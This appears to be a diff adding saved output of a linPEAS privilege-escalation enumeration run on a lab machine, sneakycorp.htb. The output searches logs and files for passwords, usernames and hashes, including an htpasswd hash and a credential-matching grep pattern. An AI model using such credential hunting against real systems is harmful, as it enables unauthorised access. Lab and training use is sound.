+
+[+] Checking for TTY (sudo/su) passwords in audit logs
+
+[+] Finding IPs inside logs (limit 70)
+    128 /var/log/nginx/access.log:10.10.14.78
+     23 /var/log/wtmp:192.168.56.1
+     13 /var/log/wtmp:192.168.56.105
+     11 /var/log/installer/status:1.2.3.3
+      7 /var/log/nginx/error.log.1:10.10.14.3
+      5 /var/log/nginx/error.log:10.10.14.78
+      2 /var/log/lastlog:192.168.56.105
+      2 /var/log/installer/status:1.18.99.90
+      1 /var/log/installer/status:1.6.99.1
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/installer/status:Description: Set up users and passwords
+Binary file /var/log/nginx/access.log.5.gz matches
+Binary file /var/log/nginx/error.log.2.gz matches
+
+[+] Finding emails inside logs (limit 70)
+     40 /var/log/installer/status:debian-boot@lists.debian.org
+     16 /var/log/installer/status:debian-kernel@lists.debian.org
+      4 /var/log/installer/status:gcs@debian.org
+      2 /var/log/installer/status:team+lvm@tracker.debian.org
+      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
+      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
+      2 /var/log/installer/status:mmind@debian.org
+      2 /var/log/installer/status:berni@debian.org
+      1 /var/log/installer/status:xnox@debian.org
+      1 /var/log/installer/status:wpa@packages.debian.org
+      1 /var/log/installer/status:tytso@mit.edu
+      1 /var/log/installer/status:rogershimizu@gmail.com
+      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
+      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
+      1 /var/log/installer/status:petere@debian.org
+      1 /var/log/installer/status:packages@release.debian.org
+      1 /var/log/installer/status:open-isns@packages.debian.org
+      1 /var/log/installer/status:open-iscsi@packages.debian.org
+      1 /var/log/installer/status:linux-xfs@vger.kernel.org
+      1 /var/log/installer/status:guus@debian.org
+      1 /var/log/installer/status:guillem@debian.org
+      1 /var/log/installer/status:djpig@debian.org
+      1 /var/log/installer/status:debian@jff.email
+      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
+      1 /var/log/installer/status:anibal@debian.org
+      1 /var/log/installer/status:aeb@debian.org
+
+[+] Finding *password* or *credential* files in home (limit 70)
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-wall.service
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
+Binary file (standard input) matches
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files
+Binary file (standard input) matches
+
+[+] Finding possible password variables inside key folders (limit 140)
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$1 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$2 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$3 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$4 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$5 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$6 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$7 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
+/var/www/dev.sneakycorp.htb/dev/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$1 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$2 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$3 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$4 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$5 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$6 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$7 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
+/var/www/sneakycorp.htb/vendor/bootstrap/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
+
+[+] Finding possible password in config files
+ /etc/nsswitch.conf
+passwd:         files systemd
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+ /etc/reportbug.conf
+password for SMTP
+passwd XXX
+ /etc/adduser.conf
+passwd
+
+[+] Finding 'username' string inside key folders (limit 70)
+/home/low/venv/lib/python3.7/site-packages/pip/_internal/download.py:            username, password = netrc_auth if netrc_auth else (None, None)
+/home/low/venv/lib/python3.7/site-packages/pip/_internal/download.py:            username, password = self.parse_credentials(parsed.netloc)
+/home/low/venv/lib/python3.7/site-packages/pip/_internal/download.py:        username = six.moves.input("User for %s: " % parsed.netloc)
+/home/low/venv/lib/python3.7/site-packages/pip/_internal/download.py:        username, password = self.passwords.get(netloc, (None, None))
+/home/low/venv/lib/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:                username=username,
+/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:            username, password = get_auth_from_url(proxy)
+/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:        username, password = get_auth_from_url(proxy)
+/home/low/venv/lib/python3.7/site-packages/requests/auth.py:            self.username == getattr(other, 'username', None),
+/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
+/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        self.username = username
+/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        username = str(username)
+/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        username = username.encode('latin1')
+/home/low/venv/lib/python3.7/site-packages/requests/sessions.py:            username, password = None, None
+/home/low/venv/lib/python3.7/site-packages/requests/sessions.py:            username, password = get_auth_from_url(new_proxies[scheme])
+/home/low/venv/lib/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/home/low/venv/lib/python3.7/site-packages/setuptools/command/upload.py:        user_pass = (self.username + ":" + self.password).encode('ascii')
+/home/low/venv/lib/python3.7/site-packages/setuptools/command/upload_docs.py:        credentials = _encode(self.username + ':' + self.password)
+/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=" + auth
+/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=%s --password=%s" % (user, pw)
+/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:        return '%(username)s:%(password)s' % vars(self)
+/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/home/low/venv/lib/python3.7/site-packages/urllib3-1.25.9.dist-info/METADATA:  username, and blank ports like 'hostname:').
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:                proxy_username=self._socks_options["username"],
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:                username, password = split
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:            "username": username,
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:        username=None,
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:    proxy_url="socks5h://<username>:<password>@proxy-host"
+/home/low/venv/lib/python3.7/site-packages/urllib3/util/request.py:        Colon-separated username:password string for 'authorization: basic ...'
+/home/low/venv/lib/python3.7/site-packages/urllib3/util/url.py:            >>> Url('http', 'username:password', 'host.com', 80,
+/home/low/venv/lib64/python3.7/site-packages/pip/_internal/download.py:            username, password = netrc_auth if netrc_auth else (None, None)
+/home/low/venv/lib64/python3.7/site-packages/pip/_internal/download.py:            username, password = self.parse_credentials(parsed.netloc)
+/home/low/venv/lib64/python3.7/site-packages/pip/_internal/download.py:        username = six.moves.input("User for %s: " % parsed.netloc)
+/home/low/venv/lib64/python3.7/site-packages/pip/_internal/download.py:        username, password = self.passwords.get(netloc, (None, None))
+/home/low/venv/lib64/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/home/low/venv/lib64/python3.7/site-packages/requests/adapters.py:                username=username,
+/home/low/venv/lib64/python3.7/site-packages/requests/adapters.py:            username, password = get_auth_from_url(proxy)
+/home/low/venv/lib64/python3.7/site-packages/requests/adapters.py:        username, password = get_auth_from_url(proxy)
+/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:            self.username == getattr(other, 'username', None),
+/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
+/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        self.username = username
+/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        username = str(username)
+/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        username = username.encode('latin1')
+/home/low/venv/lib64/python3.7/site-packages/requests/sessions.py:            username, password = None, None
+/home/low/venv/lib64/python3.7/site-packages/requests/sessions.py:            username, password = get_auth_from_url(new_proxies[scheme])
+/home/low/venv/lib64/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/home/low/venv/lib64/python3.7/site-packages/setuptools/command/upload.py:        user_pass = (self.username + ":" + self.password).encode('ascii')
+/home/low/venv/lib64/python3.7/site-packages/setuptools/command/upload_docs.py:        credentials = _encode(self.username + ':' + self.password)
+/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=" + auth
+/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=%s --password=%s" % (user, pw)
+/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:        return '%(username)s:%(password)s' % vars(self)
+/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/home/low/venv/lib64/python3.7/site-packages/urllib3-1.25.9.dist-info/METADATA:  username, and blank ports like 'hostname:').
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:                proxy_username=self._socks_options["username"],
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:                username, password = split
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:            "username": username,
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:        username=None,
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:    proxy_url="socks5h://<username>:<password>@proxy-host"
+/home/low/venv/lib64/python3.7/site-packages/urllib3/util/request.py:        Colon-separated username:password string for 'authorization: basic ...'
+/home/low/venv/lib64/python3.7/site-packages/urllib3/util/url.py:            >>> Url('http', 'username:password', 'host.com', 80,
+/tmp/linpeas.sh:    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }'
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:        username, password = get_auth_from_url(proxy)
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:            username, password = get_auth_from_url(proxy)
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/adapters.py:                username=username,
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        username = username.encode('latin1')
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        username = str(username)
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/auth.py:        self.username = username
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/requests/sessions.py:            username, password = None, None
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:        username=None,
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:                username, password = split
+/tmp/linpeas.txt:/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:            "username": username,
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/adapters.py:        username, password = get_auth_from_url(proxy)
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/adapters.py:                username=username,
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        username = username.encode('latin1')
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        username = str(username)
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/auth.py:        self.username = username
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/requests/sessions.py:            username, password = None, None
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:        username=None,
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:                username, password = split
+/tmp/linpeas.txt:/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:            "username": username,
+/tmp/lse.sh:    'grep $lse_grep_opts -Ei "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/var/www/dev.sneakycorp.htb/dev/vendor/jquery/jquery.js:                username: null,
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/pypiserver-1.3.2.dist-info/METADATA:     username: <some_username>
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/pypiserver-1.3.2.dist-info/METADATA:     username:<your_pypi_username>
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/pypiserver/__init__.py:                auther(username, password): bool
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=" + auth
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/package_index.py:        return '%(username)s:%(password)s' % vars(self)
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/pip/_internal/vcs/__init__.py:        username, password = user_pass
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/pypiserver-1.3.2.dist-info/METADATA:     username: <some_username>
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/pypiserver-1.3.2.dist-info/METADATA:     username:<your_pypi_username>
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/pypiserver/__init__.py:                auther(username, password): bool
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/command/upload.py:        self.username = (
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/package_index.py:                        creds = " --username=" + auth
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/package_index.py:        return '%(username)s:%(password)s' % vars(self)
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/package_index.py:        self.username = username
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/package_index.py:    >>> long_auth = 'username:' + 'password'*10
+/var/www/sneakycorp.htb/vendor/jquery/jquery.js:                username: null,
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+/tmp/lse.txt:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_apps.py:$P$8Ja1vJsKa5qyy/b3mCJGXM7GyBnt6..
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_apache.py:{SHA}3ipNV1GrBtxPmHFC21fCbVCSXIo=
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_context.py:$P$6........22zGEuacuPOqEpYPDeR0R/
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_hosts.py:$1$TXl/FX/U$BZge.lr.ux6ekjEjxmzwz0
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_handlers_django.py:$2a$06$DCq7YPn5Rq63x1Lad4cll.TV4S6ytwfsfvkgY8jIucDrjc8deX1s.
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_context_deprecated.py:$1$J8HC2RCr$HcmM.7NxB2weSvlw2FgzU0
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_handlers.py:$apr1$r31.....$HqJZimcKQFAMYayBlzkrA/
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_handlers_bcrypt.py:$2a$05$c92SVSfjeiCD6F2nAD6y0uBpJDjdRkt0EgeC4/31Rf2LUZbDRDE.O
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/utils.py:$1$dOHYPKoP$tnxS1T8Q6VVn3kpV8cN6o.
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/handlers/bcrypt.py:$2a$04$5BJqKfqMQvV7nS.yUguNcueVirQqDBGaLXSqj.rs.pZPlNR0UX/HK
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/handlers/phpass.py:$P$9IQRaTwmfeRo7ud9Fh4E2PdI0S3r.L0
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/handlers/django.py:$2a$06$/3OeRpbOf8/l6nPPRdZPp.nRiyYqPobEZGdNRBWihQhiFDh1ws1tu
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_apps.py:$P$8Ja1vJsKa5qyy/b3mCJGXM7GyBnt6..
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_apache.py:{SHA}3ipNV1GrBtxPmHFC21fCbVCSXIo=
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_context.py:$P$6........22zGEuacuPOqEpYPDeR0R/
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_hosts.py:$1$TXl/FX/U$BZge.lr.ux6ekjEjxmzwz0
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_handlers_django.py:$2a$06$DCq7YPn5Rq63x1Lad4cll.TV4S6ytwfsfvkgY8jIucDrjc8deX1s.
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_context_deprecated.py:$1$J8HC2RCr$HcmM.7NxB2weSvlw2FgzU0
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_handlers.py:$apr1$r31.....$HqJZimcKQFAMYayBlzkrA/
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_handlers_bcrypt.py:$2a$05$c92SVSfjeiCD6F2nAD6y0uBpJDjdRkt0EgeC4/31Rf2LUZbDRDE.O
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/utils.py:$1$dOHYPKoP$tnxS1T8Q6VVn3kpV8cN6o.
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/handlers/bcrypt.py:$2a$04$5BJqKfqMQvV7nS.yUguNcueVirQqDBGaLXSqj.rs.pZPlNR0UX/HK
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/handlers/phpass.py:$P$9IQRaTwmfeRo7ud9Fh4E2PdI0S3r.L0
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/handlers/django.py:$2a$06$/3OeRpbOf8/l6nPPRdZPp.nRiyYqPobEZGdNRBWihQhiFDh1ws1tu
+/var/www/pypi.sneakycorp.htb/.htpasswd:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/machine-id:da016d4687534834af912976d9836e16
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5
+/var/backups/dpkg.status.0: 773fb95e98a27947de4a95abb3d3f2a2
+/var/www/dev.sneakycorp.htb/dev/vendor/chart.js/Chart.bundle.js:/0e6b4a2850092356aa3ece07c6b249f0221caced/
+/var/www/dev.sneakycorp.htb/dev/vendor/chart.js/Chart.js:/0e6b4a2850092356aa3ece07c6b249f0221caced/
+/var/www/dev.sneakycorp.htb/dev/vendor/fontawesome-free/package.json:"8ceb9f09edfb85ea18a6c7bf098f6f5dd5ffd62b"
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools-40.8.0.dist-info/dependency_links.txt:=baa81e951a29958563689d868ef1064d
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_crypto_builtin_md4.py:"31d6cfe0d16ae931b73c59d7e0c089c0"
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_apps.py:$cdb462ae8b6be8784ef24b20778c4d0c82d5957f'
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/passlib/tests/test_handlers_cisco.py:"06351A3149085123301517391C501918"
+  There are more hashes files in the previous parent folder
+/var/www/pypi.sneakycorp.htb/venv/lib/python3.7/site-packages/setuptools/pep425tags.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools-40.8.0.dist-info/dependency_links.txt:=baa81e951a29958563689d868ef1064d
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_crypto_builtin_md4.py:"31d6cfe0d16ae931b73c59d7e0c089c0"
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_apps.py:$cdb462ae8b6be8784ef24b20778c4d0c82d5957f'
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/passlib/tests/test_handlers_cisco.py:"06351A3149085123301517391C501918"
+  There are more hashes files in the previous parent folder
+/var/www/pypi.sneakycorp.htb/venv/lib64/python3.7/site-packages/setuptools/pep425tags.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/var/www/sneakycorp.htb/vendor/chart.js/Chart.bundle.js:/0e6b4a2850092356aa3ece07c6b249f0221caced/
+/var/www/sneakycorp.htb/vendor/chart.js/Chart.js:/0e6b4a2850092356aa3ece07c6b249f0221caced/
+/var/www/sneakycorp.htb/vendor/fontawesome-free/package.json:"8ceb9f09edfb85ea18a6c7bf098f6f5dd5ffd62b"
+/home/low/venv/lib/python3.7/site-packages/setuptools-40.8.0.dist-info/dependency_links.txt:=baa81e951a29958563689d868ef1064d
+/home/low/venv/lib/python3.7/site-packages/setuptools/glibc.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/home/low/venv/lib/python3.7/site-packages/setuptools/pep425tags.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/home/low/venv/lib/python3.7/site-packages/requests-2.23.0.dist-info/METADATA:/e1dedc9f5ce5cd6b6c699f33d2e812daadcf3645/
+/home/low/venv/lib64/python3.7/site-packages/setuptools-40.8.0.dist-info/dependency_links.txt:=baa81e951a29958563689d868ef1064d
+/home/low/venv/lib64/python3.7/site-packages/setuptools/glibc.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/home/low/venv/lib64/python3.7/site-packages/setuptools/pep425tags.py:/8f4f15a5a95d7d5b511ceaee9ed261176c181970/
+/home/low/venv/lib64/python3.7/site-packages/requests-2.23.0.dist-info/METADATA:/e1dedc9f5ce5cd6b6c699f33d2e812daadcf3645/
+
+[+] Finding URIs with user:password@host inside key folders
+/home/low/venv/lib/python3.7/site-packages/urllib3/contrib/socks.py:    proxy_url="socks5h://<username>:<password>@proxy-host"
+/home/low/venv/lib64/python3.7/site-packages/urllib3/contrib/socks.py:    proxy_url="socks5h://<username>:<password>@proxy-host"
